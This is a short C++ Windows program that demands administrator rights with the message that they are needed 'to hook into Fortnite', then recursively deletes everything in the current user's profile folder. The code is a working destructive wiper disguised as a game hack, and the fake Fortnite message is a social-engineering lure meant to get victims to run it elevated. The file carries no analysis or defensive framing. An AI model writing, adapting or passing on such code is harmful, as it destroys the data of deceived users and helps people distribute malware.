#include <iostream>
//file operations
#include <fstream>
#include <string>
#include <windows.h>
#include <filesystem>
// this program is to delete every file in the C drive starting with the current user's profile

int main()
{
    //check if running as admin
    BOOL isAdmin;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    isAdmin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
    if (isAdmin)
    {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin))
        {
			isAdmin = FALSE;
		}
		FreeSid(AdministratorsGroup);
	}
    if (!isAdmin)
    {
		std::cout << "You must run this program as an administrator to hook into Fortnite!" << std::endl;
		return 1;
	}
    //since admin, we can now delete files
    std::string path = "C:\\Users\\";
    std::string username = getenv("USERNAME");
    path.append(username);
    //for each subdirectory in the user's profile, delete all files and subdirectories
    try {
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            if (entry.is_regular_file() || entry.is_directory()) {
                std::filesystem::remove_all(entry.path());
            }
        }

        std::cout << "All files and subdirectories in user's profile deleted successfully." << std::endl;
    }
    catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

}
